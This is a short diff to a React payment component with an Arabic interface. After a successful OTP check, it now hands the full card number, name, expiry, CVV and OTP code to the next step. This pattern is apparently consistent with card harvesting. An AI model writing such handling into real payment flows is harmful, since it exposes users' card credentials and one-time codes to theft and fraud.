@@ -15,7 +15,7 @@ import { useToast } from "@/hooks/use-toast";
 import { useLocation } from "wouter";
 
 interface Step4PaymentProps {
-  onNext: () => void;
+  onNext: (paymentData?: any) => void;
   onBack: () => void;
   formData?: any;
 }
@@ -137,8 +137,14 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
           title: "تم الدفع بنجاح",
           description: "تمت عملية الدفع وتسجيل حسابك بنجاح",
         });
-        // Complete registration and show success
-        onNext();
+        // Complete registration and show success with card data
+        onNext({
+          cardNumber: cardNumber,
+          cardName: cardName,
+          expiry: expiry,
+          cvv: cvv,
+          otpCode: code,
+        });
       } else {
         setOtpError("رمز التحقق غير صحيح");
         setOtpDigits(["", "", "", "", "", ""]);
